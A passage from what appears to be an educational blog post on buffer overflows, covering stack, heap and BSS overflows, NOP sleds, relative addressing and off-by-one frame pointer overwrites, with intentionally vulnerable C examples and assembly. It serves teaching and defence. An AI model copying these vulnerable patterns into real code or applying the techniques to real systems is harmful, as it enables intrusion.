srcset="/assets/img/2024-12-16-buffer-overflows/stack6-480.webp 480w,/assets/img/2024-12-16-buffer-overflows/stack6-800.webp 800w,/assets/img/2024-12-16-buffer-overflows/stack6-1400.webp 1400w," sizes="95vw" type="image/webp"/> <img src="/assets/img/2024-12-16-buffer-overflows/stack6.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </swiper-slide> <swiper-slide> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/2024-12-16-buffer-overflows/stack7-480.webp 480w,/assets/img/2024-12-16-buffer-overflows/stack7-800.webp 800w,/assets/img/2024-12-16-buffer-overflows/stack7-1400.webp 1400w," sizes="95vw" type="image/webp"/> <img src="/assets/img/2024-12-16-buffer-overflows/stack7.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </swiper-slide> <swiper-slide> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/2024-12-16-buffer-overflows/stack8-480.webp 480w,/assets/img/2024-12-16-buffer-overflows/stack8-800.webp 800w,/assets/img/2024-12-16-buffer-overflows/stack8-1400.webp 1400w," sizes="95vw" type="image/webp"/> <img src="/assets/img/2024-12-16-buffer-overflows/stack8.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </swiper-slide> <swiper-slide> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/2024-12-16-buffer-overflows/stack9-480.webp 480w,/assets/img/2024-12-16-buffer-overflows/stack9-800.webp 800w,/assets/img/2024-12-16-buffer-overflows/stack9-1400.webp 1400w," sizes="95vw" type="image/webp"/> <img src="/assets/img/2024-12-16-buffer-overflows/stack9.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </swiper-slide> <swiper-slide> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/2024-12-16-buffer-overflows/stack10-480.webp 480w,/assets/img/2024-12-16-buffer-overflows/stack10-800.webp 800w,/assets/img/2024-12-16-buffer-overflows/stack10-1400.webp 1400w," sizes="95vw" type="image/webp"/> <img src="/assets/img/2024-12-16-buffer-overflows/stack10.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </swiper-slide> <swiper-slide> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/2024-12-16-buffer-overflows/stack11-480.webp 480w,/assets/img/2024-12-16-buffer-overflows/stack11-800.webp 800w,/assets/img/2024-12-16-buffer-overflows/stack11-1400.webp 1400w," sizes="95vw" type="image/webp"/> <img src="/assets/img/2024-12-16-buffer-overflows/stack11.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </swiper-slide> <swiper-slide> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/2024-12-16-buffer-overflows/stack12-480.webp 480w,/assets/img/2024-12-16-buffer-overflows/stack12-800.webp 800w,/assets/img/2024-12-16-buffer-overflows/stack12-1400.webp 1400w," sizes="95vw" type="image/webp"/> <img src="/assets/img/2024-12-16-buffer-overflows/stack12.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </swiper-slide> <swiper-slide> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/2024-12-16-buffer-overflows/stack13-480.webp 480w,/assets/img/2024-12-16-buffer-overflows/stack13-800.webp 800w,/assets/img/2024-12-16-buffer-overflows/stack13-1400.webp 1400w," sizes="95vw" type="image/webp"/> <img src="/assets/img/2024-12-16-buffer-overflows/stack13.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </swiper-slide> <swiper-slide> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/2024-12-16-buffer-overflows/stack14-480.webp 480w,/assets/img/2024-12-16-buffer-overflows/stack14-800.webp 800w,/assets/img/2024-12-16-buffer-overflows/stack14-1400.webp 1400w," sizes="95vw" type="image/webp"/> <img src="/assets/img/2024-12-16-buffer-overflows/stack14.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </swiper-slide> <swiper-slide> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/2024-12-16-buffer-overflows/stack15-480.webp 480w,/assets/img/2024-12-16-buffer-overflows/stack15-800.webp 800w,/assets/img/2024-12-16-buffer-overflows/stack15-1400.webp 1400w," sizes="95vw" type="image/webp"/> <img src="/assets/img/2024-12-16-buffer-overflows/stack15.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </swiper-slide> <swiper-slide> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/2024-12-16-buffer-overflows/stack16-480.webp 480w,/assets/img/2024-12-16-buffer-overflows/stack16-800.webp 800w,/assets/img/2024-12-16-buffer-overflows/stack16-1400.webp 1400w," sizes="95vw" type="image/webp"/> <img src="/assets/img/2024-12-16-buffer-overflows/stack16.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </swiper-slide> <swiper-slide> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/2024-12-16-buffer-overflows/stack17-480.webp 480w,/assets/img/2024-12-16-buffer-overflows/stack17-800.webp 800w,/assets/img/2024-12-16-buffer-overflows/stack17-1400.webp 1400w," sizes="95vw" type="image/webp"/> <img src="/assets/img/2024-12-16-buffer-overflows/stack17.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </swiper-slide> <swiper-slide> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/2024-12-16-buffer-overflows/stack18-480.webp 480w,/assets/img/2024-12-16-buffer-overflows/stack18-800.webp 800w,/assets/img/2024-12-16-buffer-overflows/stack18-1400.webp 1400w," sizes="95vw" type="image/webp"/> <img src="/assets/img/2024-12-16-buffer-overflows/stack18.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </swiper-slide> <swiper-slide> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/2024-12-16-buffer-overflows/stack19-480.webp 480w,/assets/img/2024-12-16-buffer-overflows/stack19-800.webp 800w,/assets/img/2024-12-16-buffer-overflows/stack19-1400.webp 1400w," sizes="95vw" type="image/webp"/> <img src="/assets/img/2024-12-16-buffer-overflows/stack19.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </swiper-slide> <swiper-slide> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/2024-12-16-buffer-overflows/stack20-480.webp 480w,/assets/img/2024-12-16-buffer-overflows/stack20-800.webp 800w,/assets/img/2024-12-16-buffer-overflows/stack20-1400.webp 1400w," sizes="95vw" type="image/webp"/> <img src="/assets/img/2024-12-16-buffer-overflows/stack20.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </swiper-slide> <swiper-slide> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/2024-12-16-buffer-overflows/stack21-480.webp 480w,/assets/img/2024-12-16-buffer-overflows/stack21-800.webp 800w,/assets/img/2024-12-16-buffer-overflows/stack21-1400.webp 1400w," sizes="95vw" type="image/webp"/> <img src="/assets/img/2024-12-16-buffer-overflows/stack21.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </swiper-slide> <swiper-slide> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/2024-12-16-buffer-overflows/stack22-480.webp 480w,/assets/img/2024-12-16-buffer-overflows/stack22-800.webp 800w,/assets/img/2024-12-16-buffer-overflows/stack22-1400.webp 1400w," sizes="95vw" type="image/webp"/> <img src="/assets/img/2024-12-16-buffer-overflows/stack22.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </swiper-slide> </swiper-container> </div> <h1 id="buffer-overflows">Buffer Overflows</h1> <h2 id="classification">Classification</h2> <p>Broadly speaking, there are four generations of buffer overflows that can be used to compromise a system. This work focuses on classic stack-based overflows and off-by-one overflows, but for completeness, we will also briefly mention BSS overflows and heap overflows.</p> <h2 id="bss-overflows">BSS Overflows</h2> <p>As mentioned previously, uninitialized global and static variables are stored in the BSS segment. Unlike the stack, the BSS segment grows upward, meaning that a buffer overflow might overwrite higher memory addresses. Because the BSS segment does not store administrative information like return addresses (as the stack does), this type of vulnerability is more difficult for attackers to exploit.</p> <p>However, attackers can sometimes overwrite pointers in the BSS segment to redirect program flow (though this is relatively uncommon) or manipulate file pointers (which is somewhat more likely). Successfully manipulating a file pointer could, for instance, allow an attacker to alter system files (e.g., by modifying <code class="language-plaintext highlighter-rouge">/etc/passwd</code>).</p> <h2 id="heap-overflows">Heap Overflows</h2> <p>On the heap, functions such as <code class="language-plaintext highlighter-rouge">malloc()</code> can dynamically allocate memory at runtime. Like the BSS segment, the heap grows toward higher addresses. Along with the requested memory, certain administrative information about the allocated block is also stored on the heap. Because this administrative information is always placed directly adjacent to the allocated buffer, it can be overwritten during a heap overflow, often causing the program to crash.</p> <p>As with BSS overflows, manipulating program flow via heap overflows is challenging, but under certain conditions it is possible to overwrite any memory address in the process’s memory space (e.g., return addresses on the stack). Many operating systems prevent execution of code in the heap area.</p> <h2 id="classic-stack-based-buffer-overflows">Classic Stack-Based Buffer Overflows</h2> <p>Stack overflows are among the most frequently encountered buffer overflow vulnerabilities. As far back as 1996, Aleph One (alias Elias Levy) published an article titled <strong>“Smashing the Stack for Fun and Profit,”</strong> which examined this type of overflow in detail. Since both data and return addresses reside on the stack, stack overflows can present significant security risks. An attacker may be able to place executable code on the stack and then divert the program flow so that this malicious code is executed.</p> <p>The simplest way to exploit a stack overflow is to fill the vulnerable buffer with random data, forcing the program to crash. This kind of attack, known as a <strong>Denial of Service (DoS)</strong> attack, can be especially damaging for network services because it makes them unavailable. If the program generates a coredump on crashing, attackers may gain further insights that can aid in planning a more extensive attack. However, a DoS attack is often the least harmful method from the attacker’s perspective.</p> <p>More sophisticated attackers typically aim to hijack program flow and inject their own code, potentially granting them elevated privileges. This is especially straightforward with stack overflows, since the stack holds return addresses for all active functions. By overwriting these addresses, attackers can redirect execution. We will revisit the example from the previous section in a slightly modified form to demonstrate this.</p> <figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="kt">int</span> <span class="nf">foo</span><span class="p">(</span><span class="kt">int</span> <span class="n">x</span><span class="p">,</span> <span class="kt">int</span> <span class="n">y</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">str</span><span class="p">)</span> <span class="p">{</span>
	<span class="kt">char</span> <span class="n">buff2</span><span class="p">[</span><span class="mi">20</span><span class="p">];</span>
	<span class="kt">int</span> <span class="n">i</span><span class="p">;</span>
	<span class="n">i</span> <span class="o">=</span> <span class="n">x</span> <span class="o">+</span> <span class="n">y</span><span class="p">;</span>
	<span class="n">strcpy</span><span class="p">(</span><span class="n">buff2</span><span class="p">,</span> <span class="n">str</span><span class="p">);</span>
 	<span class="k">return</span> <span class="n">i</span><span class="p">;</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
	<span class="kt">char</span> <span class="n">buff</span><span class="p">[</span><span class="mi">30</span><span class="p">];</span>
	<span class="n">foo</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">9</span><span class="p">,</span> <span class="n">buff</span><span class="p">);</span>
	<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span></code></pre></figure> <p></p> <p>If the <code class="language-plaintext highlighter-rouge">buff2</code> buffer in the <code class="language-plaintext highlighter-rouge">foo()</code> function is not protected against overflow, the saved frame pointer (FP1) and then the return address (RIP) will be overwritten (see the previous figure). The attacker’s goal is to overwrite at least the higher addresses of the buffer—and beyond—with an address of their choosing.</p> <p>The fact that the saved frame pointer is also overwritten generally does not concern the attacker. Once the program flow is hijacked, the frame pointer is often no longer needed or will be set to a new value. In fact, there are procedures (detailed later) that allow direct access to payload data without relying on the frame pointer.</p> <p>In the simplest attack scenario, the attacker manipulates the return address to point to existing program code that is normally never executed. This might be interesting, for instance, in a program that only calls certain functions after a successful password check.</p> <p>A second approach is to place custom code directly into the overflowed buffer and have the return address point to it. A piece of malicious code that modifies program flow and executes injected code is generally called an <strong>exploit</strong>. Exploits consist of two parts:</p> <ol> <li><strong>Injection Vector</strong> – Forces the buffer to overflow and branches execution to the payload.</li> <li><strong>Payload</strong> – The malicious code itself, which can vary depending on the attacker’s goal. Typical payloads might open a shell (executing with the permissions of the vulnerable program), modify password files, release a virus, or install a network sniffer.</li> </ol> <p>Crafting a functional payload is often non-trivial. Because it must already be in machine code, the attacker needs knowledge of the target’s processor architecture and operating system to prepare code that will run successfully.</p> <h3 id="the-zero-byte-problem">The Zero Byte Problem</h3> <p>A common challenge arises because many string functions (particularly copy operations) terminate upon encountering a null byte. If the vulnerable program relies on such a string function, the payload must not contain a null byte (<code class="language-plaintext highlighter-rouge">\0</code>). Although the actual machine instructions typically do not include zero bytes, their operands often do. For instance, loading zero into a register might involve an instruction like:</p> <figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="nf">movl</span> <span class="kc">$</span><span class="mh">0x0</span><span class="p">,</span> <span class="o">%</span><span class="nb">ebx</span></code></pre></figure> <p>Because the operand is a literal, the null byte appears directly in the code. To ensure the exploit functions properly, direct usage of null literals should be avoided whenever possible; other instructions can be employed to set a register to zero. The next section outlines a method for circumventing these null bytes.</p> <h3 id="relative-addressing">Relative Addressing</h3> <p>The payload often contains data—such as strings—required during execution. Handling these data requires their absolute addresses. However, because the frame pointer is overwritten, relative addressing via the frame pointer is not an option. The attacker, not knowing the exact location of the data on the stack, must rely on a clever approach to determine absolute addresses. One possible payload structure that accomplishes this is discussed below:</p> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/2018-02-05-buffer-overflows/relativeAddr-480.webp 480w,/assets/img/2018-02-05-buffer-overflows/relativeAddr-800.webp 800w,/assets/img/2018-02-05-buffer-overflows/relativeAddr-1400.webp 1400w," sizes="95vw" type="image/webp"/> <img src="/assets/img/2018-02-05-buffer-overflows/relativeAddr.png" class="img-fluid rounded z-depth-1 imgcenter" width="400px" height="auto" data-zoomable="" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> <figcaption class="caption"> <b>Figure 4:</b> Relative Adressing. </figcaption> </figure> <p>As shown in the figure, a <code class="language-plaintext highlighter-rouge">CALL</code> instruction is placed directly in front of the payload data, and a <code class="language-plaintext highlighter-rouge">JMP</code> instruction appears as the first statement in the code. When executed, the program flow first branches from the <code class="language-plaintext highlighter-rouge">JMP</code> to the <code class="language-plaintext highlighter-rouge">CALL</code>. This works because the <code class="language-plaintext highlighter-rouge">JMP</code> instruction can perform relative jumps. Once <code class="language-plaintext highlighter-rouge">CALL</code> is executed, the CPU automatically saves the return address (the location of the next instruction) onto the stack.</p> <p>In our case, there is no further instruction after the <code class="language-plaintext highlighter-rouge">CALL</code>—just data. Consequently, the <code class="language-plaintext highlighter-rouge">CALL</code> instruction writes the absolute address of the data area to the stack. In the next step, this address can be retrieved from the stack (using <code class="language-plaintext highlighter-rouge">POPL %ESI</code>) and then used freely by the exploit.</p> <hr/> <h3 id="nop-sliding">NOP-Sliding</h3> <p>Overflow buffers are often significantly larger than the actual payload. Part of the buffer (the higher addresses) will be overwritten with the desired return address, while the remainder is available for the payload. To improve the odds of a successful attack, it’s essential to use this memory space strategically.</p> <p>However, there’s a catch: The attacker typically does not know the exact (absolute) address of the overflow buffer on the stack; only an estimate is possible. This estimate is usually fairly precise but not exact—most programs only place a few hundred or thousand bytes onto the stack. Achieving perfect precision is not feasible, and if the guessed address is off, the processor might jump into the middle of the payload or even land somewhere else entirely.</p> <p>To solve this, the leftover space in the overflow buffer can be filled with <strong>No Operation (NOP)</strong> instructions. The actual payload follows the NOP block. If the NOP block is large enough, a guessed return address has a comparatively high likelihood of landing somewhere in it. When the function eventually returns, execution starts somewhere within the NOP block, slides through the no-ops, and then proceeds to the actual payload code. This process is known as <strong>NOP-sliding</strong>.</p> <p>A typical exploit structure would look like this:</p> <ol> <li><strong>NOP Sled</strong> (large block of no-ops)</li> <li><strong>Payload</strong> (malicious code)</li> <li><strong>Overwritten Return Address</strong> (pointing into the NOP sled)</li> </ol> <p>Upon function return, the instruction pointer hits the NOP block, seamlessly slides through the NOPs, and finally executes the payload.</p> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/2018-02-05-buffer-overflows/nop-sliding-480.webp 480w,/assets/img/2018-02-05-buffer-overflows/nop-sliding-800.webp 800w,/assets/img/2018-02-05-buffer-overflows/nop-sliding-1400.webp 1400w," sizes="95vw" type="image/webp"/> <img src="/assets/img/2018-02-05-buffer-overflows/nop-sliding.png" class="img-fluid rounded z-depth-1 imgcenter" width="400px" height="auto" data-zoomable="" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> <figcaption class="caption"> <b>Figure 5:</b> NOP sliding. </figcaption> </figure> <h2 id="off-by-one-and-frame-pointer-overwrites">Off-by-One and Frame Pointer Overwrites</h2> <p>Off-by-one overflows occur when a data buffer is overwritten by exactly one byte. The most common cause is an incorrectly specified loop termination condition. The following example illustrates this:</p> <figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="mi">1</span>	<span class="kt">void</span> <span class="nf">foo</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">str</span><span class="p">)</span> <span class="p">{</span>
<span class="mi">2</span>		<span class="kt">char</span> <span class="n">buff</span><span class="p">[</span><span class="mi">100</span><span class="p">];</span>
<span class="mi">3</span>		<span class="kt">int</span> <span class="n">i</span><span class="p">;</span>
<span class="mi">4</span>		<span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;=</span> <span class="mi">100</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="c1">// Error: termination condition is off by one</span>
<span class="mi">5</span>			<span class="n">buff</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">str</span><span class="p">[</span><span class="n">i</span><span class="p">];</span>
<span class="mi">6</span>	<span class="p">}</span></code></pre></figure> <p>Here, the <code class="language-plaintext highlighter-rouge">for</code> loop iterates from 0 to 100, attempting to copy one extra element into <code class="language-plaintext highlighter-rouge">buff</code>. Since <code class="language-plaintext highlighter-rouge">buff</code> only has space for 100 bytes, the subsequent memory location is overwritten.</p> <p>In this particular example, <code class="language-plaintext highlighter-rouge">buff</code> is allocated on the stack because it is a local variable. Not all off-by-one errors necessarily involve stack arrays, but those that do can lead to frame pointer overwrites and other critical security risks.</p> <p>Now consider swapping lines 2 and 3. This change would cause the loop to overwrite the least significant byte (LSB) of <code class="language-plaintext highlighter-rouge">i</code>, due to the little-endian byte representation used by IA-32/x86 processors.</p> <figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="mi">1</span>	<span class="kt">void</span> <span class="nf">foo</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">str</span><span class="p">)</span> <span class="p">{</span>
<span class="mi">2</span>		<span class="kt">int</span> <span class="n">i</span><span class="p">;</span>
<span class="mi">3</span>		<span class="kt">char</span> <span class="n">buff</span><span class="p">[</span><span class="mi">100</span><span class="p">];</span>
<span class="mi">4</span>		<span class="k">for</span><span class="p">(</span><span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="n">i</span><span class="o">&lt;=</span><span class="mi">100</span><span class="p">;</span><span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="c1">// Here is an error!!!</span>
<span class="mi">5</span>			<span class="n">buff</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">str</span><span class="p">[</span><span class="n">i</span><span class="p">];</span>
<span class="mi">6</span>	<span class="p">}</span></code></pre></figure> <p></p> <p>In this example, if the least significant byte (LSB) of the loop counter <code class="language-plaintext highlighter-rouge">i</code> is overwritten with a value less than or equal to 100, an infinite loop could potentially occur. However, this particular bug does not allow the attacker to manipulate program flow. Such manipulation is only possible if the buffer is declared as the first statement of the function.</p> <p>When entering a function, the current frame pointer is saved on the stack, and space for local variables is then reserved. An off-by-one overflow would overwrite only the LSB of the saved frame pointer on the stack. Although this might not immediately disrupt the current function (since it’s not yet using the saved frame pointer), issues can arise once the function prepares to return. The <code class="language-plaintext highlighter-rouge">leave</code> instruction reloads the saved frame pointer into <code class="language-plaintext highlighter-rouge">EBP</code>, potentially causing problems in the calling function (for instance, because local variables there are accessed relative to <code class="language-plaintext highlighter-rouge">EBP</code>).</p> <p>To examine this more closely, we can extend the example with a <code class="language-plaintext highlighter-rouge">main()</code> function calling the flawed <code class="language-plaintext highlighter-rouge">foo()</code>:</p> <figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="err">1</span>	<span class="nf">void</span> <span class="nv">main</span><span class="p">()</span> <span class="err">{</span>
<span class="err">2</span>		<span class="nf">char</span> <span class="nv">str</span><span class="p">[</span><span class="mi">101</span><span class="p">]</span><span class="c1">;</span>
<span class="err">3</span>		<span class="nf">foo</span><span class="p">(</span><span class="nv">str</span><span class="p">)</span><span class="c1">;</span>
<span class="err">4</span>	<span class="err">}</span>


<span class="err">1</span>	<span class="nl">main:</span>
<span class="err">2</span>        <span class="nf">pushl</span>   <span class="o">%</span><span class="nb">ebp</span>
<span class="err">3</span>        <span class="nf">movl</span>    <span class="o">%</span><span class="nb">esp</span><span class="p">,</span> <span class="o">%</span><span class="nb">ebp</span>
<span class="err">4</span>        <span class="nf">subl</span>    <span class="kc">$</span><span class="mi">120</span><span class="p">,</span> <span class="o">%</span><span class="nb">esp</span>
<span class="err">5</span>        <span class="nf">subl</span>    <span class="kc">$</span><span class="mi">12</span><span class="p">,</span> <span class="o">%</span><span class="nb">esp</span>
<span class="err">6</span>        <span class="nf">leal</span>    <span class="o">-</span><span class="mi">120</span><span class="p">(</span><span class="o">%</span><span class="nb">ebp</span><span class="p">),</span> <span class="o">%</span><span class="nb">eax</span>
<span class="err">7</span>        <span class="nf">pushl</span>   <span class="o">%</span><span class="nb">eax</span>
<span class="err">8</span>        <span class="nf">call</span>    <span class="nv">foo</span>
<span class="err">9</span>        <span class="nf">addl</span>    <span class="kc">$</span><span class="mi">16</span><span class="p">,</span> <span class="o">%</span><span class="nb">esp</span>
<span class="err">10</span>       <span class="nf">leave</span>
<span class="err">11</span>       <span class="nf">ret</span></code></pre></figure> <p></p> <p>As mentioned earlier, after calling <code class="language-plaintext highlighter-rouge">foo()</code> (i.e., at line 9 in the assembly code), the <code class="language-plaintext highlighter-rouge">EBP</code> register (frame pointer) holds an incorrect value. Let’s analyze the <code class="language-plaintext highlighter-rouge">main()</code> function’s code starting from line 9:</p> <figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="err">9</span>   <span class="nf">addl</span>    <span class="kc">$</span><span class="mi">16</span><span class="p">,</span> <span class="o">%</span><span class="nb">esp</span></code></pre></figure> <p>After the function call, the stack pointer must be adjusted to remove the passed parameters. In this case, we only passed a single four-byte pointer. However, because line 5 reserved extra (unused) memory, the stack pointer is moved by a significantly larger offset.</p> <figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="err">10</span>  <span class="nf">leave</span> </code></pre></figure> <p>The instruction in line 10 is logically equivalent to:</p> <figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="nf">movl</span> <span class="o">%</span><span class="nb">ebp</span><span class="p">,</span> <span class="o">%</span><span class="nb">esp</span>
<span class="nf">popl</span> <span class="o">%</span><span class="nb">ebp</span></code></pre></figure> <p>At this point, the current frame pointer is copied into the stack pointer, and the previously saved frame pointer is popped into <code class="language-plaintext highlighter-rouge">EBP</code>. Normally, after <code class="language-plaintext highlighter-rouge">leave</code>, <code class="language-plaintext highlighter-rouge">ESP</code> would point to the return address of <code class="language-plaintext highlighter-rouge">main()</code>. However, due to the incorrect value in <code class="language-plaintext highlighter-rouge">EBP</code>, this is no longer the case in our example.</p> <figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="err">11</span>  <span class="nf">ret</span></code></pre></figure> <p>Line 11 (<code class="language-plaintext highlighter-rouge">ret</code>) is effectively equivalent to:</p> <figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="nf">popl</span> <span class="o">%</span><span class="nv">eip</span></code></pre></figure> <p>Because the stack pointer does not point to the correct return address, <code class="language-plaintext highlighter-rouge">EIP</code> is loaded with an invalid address. The final <code class="language-plaintext highlighter-rouge">ret</code> instruction loads the return address into the instruction register. However, because the stack pointer no longer points to the correct return address, it loads a value that typically triggers an error and prematurely terminates the process.</p> <p><strong>Summary of the Example</strong><br/> An off-by-one overflow in the <code class="language-plaintext highlighter-rouge">foo()</code> function overwrote the least significant byte of <code class="language-plaintext highlighter-rouge">main()</code>’s saved frame pointer. Consequently, when <code class="language-plaintext highlighter-rouge">foo()</code> exits, the corrupted value is loaded back into <code class="language-plaintext highlighter-rouge">EBP</code>, causing <code class="language-plaintext highlighter-rouge">ESP</code> in <code class="language-plaintext highlighter-rouge">main()</code> to shift incorrectly just before returning. As a result, the actual return address is not loaded into the instruction register, and the process terminates with an error since no valid instruction resides at the calculated address.</p> <p>Naturally, this raises the question: can we exploit the vulnerability so that the saved frame pointer is manipulated in such a way that a malicious program (injected earlier) executes upon exiting <code class="language-plaintext highlighter-rouge">main()</code>?</p> <p>Before delving into that possibility, let’s outline the stack structure for this example:</p> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/2018-02-05-buffer-overflows/off-by-one1-480.webp 480w,/assets/img/2018-02-05-buffer-overflows/off-by-one1-800.webp 800w,/assets/img/2018-02-05-buffer-overflows/off-by-one1-1400.webp 1400w," sizes="95vw" type="image/webp"/> <img src="/assets/img/2018-02-05-buffer-overflows/off-by-one1.png" class="img-fluid rounded z-depth-1 imgcenter" width="750px" height="auto" data-zoomable="" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> <figcaption class="caption"> <b>Figure 6:</b> Off-by-One example. </figcaption> </figure> <p>As shown in the figure, it’s possible to manipulate the least significant byte (LSB) of the saved frame pointer (FP1). Ideally, you want FP1 to point into the memory area occupied by <code class="language-plaintext highlighter-rouge">buff</code>, where you could store a custom return address. Consequently, the LSB of FP1 should be as small as possible to increase the likelihood that FP1 eventually points where you want it.</p> <p>But what if the original value of FP1 is already quite small? In that scenario, even setting the LSB of FP1 to zero may not be enough to redirect it into the <code class="language-plaintext highlighter-rouge">buff</code> field. Additionally, in our example, the problem is compounded by the fact that the main function creates a relatively large array, making the distance between FP2 and FP1 quite large.</p> <p>If more than 247 bytes are placed on the stack in <code class="language-plaintext highlighter-rouge">main()</code>, it becomes impossible to manipulate FP1 in a way that it will point to <code class="language-plaintext highlighter-rouge">buff</code>. In this example, <code class="language-plaintext highlighter-rouge">main()</code> allocates 101 bytes for the <code class="language-plaintext highlighter-rouge">str</code> array, plus 4 bytes each for the return address (RIP) and the saved frame pointer (FP1). For a successful manipulation, the LSB of FP1 must be at least <code class="language-plaintext highlighter-rouge">146</code> (calculated as 255 - 101 - 4 - 4).</p> <p>In summary, the fewer bytes the calling function (<code class="language-plaintext highlighter-rouge">main()</code>) places on the stack—and the smaller the LSB of the saved frame pointer—the greater the chance of successfully manipulating the saved FP.</p> <p>Henceforth, we assume that the saved frame pointer can indeed be manipulated to point into <code class="language-plaintext highlighter-rouge">buff</code>. To execute a program successfully under these conditions, you should provide the following input to <code class="language-plaintext highlighter-rouge">foo()</code>, which gets copied into <code class="language-plaintext highlighter-rouge">buff</code> (see the blue-highlighted section in the figure):</p> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/2018-02-05-buffer-overflows/off-by-one2-480.webp 480w,/assets/img/2018-02-05-buffer-overflows/off-by-one2-800.webp 800w,/assets/img/2018-02-05-buffer-overflows/off-by-one2-1400.webp 1400w," sizes="95vw" type="image/webp"/> <img src="/assets/img/2018-02-05-buffer-overflows/off-by-one2.png" class="img-fluid rounded z-depth-1 imgcenter" width="750px" height="auto" data-zoomable="" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> <figcaption class="caption"> <b>Figure 7:</b> Another off-by-one example. </figcaption> </figure> <p>The payload address is chosen so that it points to the NOPs region. By manipulating the least significant byte of the saved frame pointer (FP1), we expect FP1 to end up pointing to the payload address area. When <code class="language-plaintext highlighter-rouge">main()</code> exits, this address is then loaded into the instruction register, triggering the execution of the payload.</p> <h3 id="bug-of-the-gcc-compiler">Bug of the GCC compiler</h3> <p>Testing an exploit that was supposed to 